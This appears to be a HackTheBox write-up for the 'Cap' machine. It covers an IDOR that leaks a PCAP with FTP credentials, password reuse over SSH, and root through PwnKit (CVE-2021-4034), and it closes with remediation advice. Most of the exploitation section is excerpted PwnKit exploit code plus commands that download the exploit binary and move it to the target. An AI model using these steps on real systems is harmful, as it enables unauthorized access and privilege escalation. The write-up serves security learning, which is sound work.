---
title: "Cap HTB Walkthrough - Exploiting IDOR and PwnKit"
seoTitle: "IDOR and PwnKit Exploit Guide"
seoDescription: "Explore an easy Linux machine on HackTheBox, exploiting IDOR and PwnKit vulnerabilities for unauthorized access and privilege escalation"
datePublished: Mon Sep 01 2025 11:46:18 GMT+0000 (Coordinated Universal Time)
cuid: cmf12063c000g02lb3sb1csio
slug: cap-htb-walkthrough-exploiting-idor-and-pwnkit
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1756726647638/2ca739d1-3148-4c31-b561-dc8657302877.jpeg
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1756727152883/2b4050b9-e5e0-4623-85eb-36bb173764d1.jpeg
tags: hacking, ctf, hackthebox, cybersecurity-1, ctf-writeup

---

## Introduction

Cap is an easy-difficulty Linux machine from HackTheBox that demonstrates the importance of proper access controls and keeping systems updated. This walkthrough covers the complete exploitation path from initial reconnaissance to privilege escalation.

## Target Information

**IP Address:** `10.10.10.245`  
**Hostname:** `cap.htb`

Add the following entry to your `/etc/hosts` file:

```bash
10.10.10.245 cap.htb
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756726669156/14721128-a28b-4ca1-85b8-dddad8fb4d94.png align="center")

## Reconnaissance & Enumeration

### Port Scanning

I started with a comprehensive port scan using rustscan to identify open services:

```bash
rustscan -a 10.10.10.245 --ulimit 5000 -- -sV -sC
```

**Results:**

* **Port 21:** FTP (vsftpd 3.0.3)
    
* **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
    
* **Port 80:** HTTP (gunicorn web server)
    

The scan revealed a standard Ubuntu system with three common services running.

### Service Enumeration

#### FTP Service Analysis (Port 21)

I attempted anonymous FTP access but was unsuccessful:

```bash
ftp 10.10.10.245
# Tried anonymous login - failed
# 530 Login incorrect
```

Anonymous access was denied, so I moved on to other services.

#### SSH Service Analysis (Port 22)

SSH was running a recent version (OpenSSH 8.2p1) with no obvious vulnerabilities. Without credentials, I proceeded to web service enumeration.

#### Web Service Analysis (Port 80)

The web server hosted a "Security Dashboard" application. Initial exploration revealed:

1. **Main Dashboard:** A security monitoring interface
    
2. **Data Download Feature:** Ability to download network capture files
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756726714046/4b5f9465-98c5-48bf-a26b-807162008423.png align="center")

The most interesting feature was a data download page that allowed users to download PCAP files:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756726766213/05152675-20f0-409d-a82f-764128ee7e6c.png align="center")

## Exploitation

### IDOR Vulnerability Discovery

While examining the data download functionality, I noticed the URL structure:

```plaintext
http://cap.htb/data/[ID]
```

This suggested a potential Insecure Direct Object Reference (IDOR) vulnerability. The application was likely serving different data files based on the ID parameter without proper authorization checks.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756726785168/5d444db5-56ab-4aa6-9e0d-0fd8a87a4bc1.png align="center")

I tested this by changing the data ID from the default value to `0`, attempting to access potentially older or different data:

```bash
curl -o data0.pcap http://cap.htb/data/0
```

### PCAP File Analysis

The downloaded PCAP file contained network traffic that revealed valuable information. Using Wireshark for analysis, I discovered:

1. **FTP Connection Logs:** Clear-text FTP authentication attempts
    
2. **Credentials Exposure:** Username and password transmitted in plain text
    

From the packet analysis, I extracted the following credentials:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756726825780/f5b569b8-19b5-456d-b45f-9750304fdecb.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756726835401/d833ccea-1930-48fa-8e7a-34e383c8ef95.png align="center")

**Discovered Credentials:**

* **Username:** `nathan`
    
* **Password:** `Buck3tH4TF0RM3!`
    

### Initial Access via FTP

With the discovered credentials, I successfully authenticated to the FTP service:

```bash
ftp 10.10.10.245
# Username: nathan
# Password: Buck3tH4TF0RM3!
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756726884551/c0a3d7b6-9467-4ff6-bd99-882b5a9bca0a.png align="center")

**User Flag:** `e5f9e5793b86300994c4cad177ace7f6`

### Credential Reuse Attack

Testing for password reuse, I attempted SSH authentication with the same credentials:

```bash
ssh nathan@cap.htb
# Password: Buck3tH4TF0RM3!
```

The attack was successful! This demonstrates a common security weakness where users reuse passwords across multiple services.

## Privilege Escalation

### System Enumeration

After gaining initial access as user `nathan`, I performed standard privilege escalation enumeration:

```bash
# Check user privileges
id
sudo -l  # No sudo privileges

# System information
uname -a
# Linux cap 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021

# Search for SUID binaries
find / -perm -u=s -type f 2>/dev/null
```

The enumeration revealed several standard SUID binaries, including `pkexec`.

### PwnKit Vulnerability (CVE-2021-4034)

I checked the pkexec version and found it was vulnerable to the PwnKit vulnerability:

```bash
pkexec --version
# pkexec version 0.105
```

This version is vulnerable to CVE-2021-4034, a memory corruption vulnerability in polkit's pkexec that allows local privilege escalation.

## Understanding the PwnKit Exploit

### What is PwnKit?

PwnKit (CVE-2021-4034) is a critical vulnerability discovered in January 2022 that affects polkit's `pkexec` utility. This vulnerability has been present in the code for over 12 years, affecting virtually all major Linux distributions.

### Technical Details

**Polkit Overview:**

* Polkit (formerly PolicyKit) is a system service that controls system-wide privileges on Unix-like systems
    
* `pkexec` is a component that allows authorized users to execute commands as another user (similar to sudo)
    
* It's installed by default on most Linux distributions
    

**The Vulnerability:** The vulnerability exists in the argument processing logic of `pkexec`. When `pkexec` is called without any arguments, it:

1. **Out-of-bounds Write:** The program writes a null terminator (`\0`) to an out-of-bounds memory location
    
2. **Environment Variable Manipulation:** By carefully crafting environment variables, an attacker can control what gets overwritten
    
3. **Code Execution:** This memory corruption can be leveraged to achieve arbitrary code execution with root privileges
    

### Exploit Mechanism

The exploit works by:

1. **Creating Malicious Environment Variables:**
    
    ```bash
    GCONV_PATH=.
    CHARSET=pkexec
    SHELL=pkexec
    ```
    
2. **Setting up a Fake gconv Module:**
    
    * Creates a directory structure that mimics glibc's character conversion modules
        
    * Places a malicious shared library that will be loaded
        
3. **Triggering the Vulnerability:**
    
    * Calls `pkexec` with no arguments to trigger the out-of-bounds write
        
    * The memory corruption causes the system to load the attacker's malicious code
        
    * The malicious code executes with root privileges
        

### Exploit Code Analysis

The PwnKit exploit I used contains several key components:

```c
// Key sections of the exploit:

// 1. Directory and file creation for the fake gconv module
res = mkdir("GCONV_PATH=.", 0777);
res = mkdir(".pkexec", 0777);

// 2. Creating the gconv-modules configuration
fp = fopen(".pkexec/gconv-modules", "w+");
fputs("module UTF-8// PKEXEC// pkexec 2", fp);

// 3. The gconv_init function that gets executed as root
void gconv_init()
{
    setresuid(0, 0, 0);  // Set real, effective, and saved UIDs to root
    setresgid(0, 0, 0);  // Set real, effective, and saved GIDs to root
    
    // Execute shell with root privileges
    execve("/bin/bash", (char *[]){"-i", NULL}, NULL);
}
```

### Why This Exploit is So Dangerous

1. **Universal Impact:** Affects virtually all Linux systems with polkit installed
    
2. **No Authentication Required:** Any local user can exploit it
    
3. **Reliable Exploitation:** The exploit works consistently across different systems
    
4. **Stealth:** Leaves minimal traces in system logs
    
5. **Age of Vulnerability:** Present in code for over 12 years before discovery
    

### Exploit Deployment

I downloaded the PwnKit exploit from the ly4k repository:

```bash
# On attacking machine
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit

# Transfer to target
python -m http.server 8000
```

```bash
# On target machine
curl http://10.10.14.93:8000/PwnKit -o PwnKit
chmod +x PwnKit
```

### Root Access

Executing the PwnKit exploit successfully escalated privileges to root:

```bash
./PwnKit
# root@cap:/home/nathan#
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756726937133/b4c8e96e-8c21-4b18-a296-a090231c82a1.png align="center")

**Root Flag:** `275b280d0b34b7b387122b9885386684`

## Key Takeaways

This machine highlighted several important security concepts:

1. **IDOR Vulnerabilities:** Improper access controls can expose sensitive data
    
2. **Credential Reuse:** Using the same passwords across services creates security risks
    
3. **Clear-text Protocols:** FTP transmits credentials in plain text
    
4. **Patch Management:** Keeping systems updated prevents known vulnerability exploitation
    

## Remediation Recommendations

* Implement proper authorization checks for data access
    
* Enforce strong, unique passwords for different services
    
* Use encrypted protocols (SFTP/SSH instead of FTP)
    
* Maintain regular system updates and security patches
    
* Monitor network traffic for suspicious activities
    

## Conclusion

Cap demonstrates how multiple security weaknesses can be chained together for complete system compromise. The attack path from IDOR to credential disclosure to privilege escalation shows the importance of defense in depth and regular security assessments.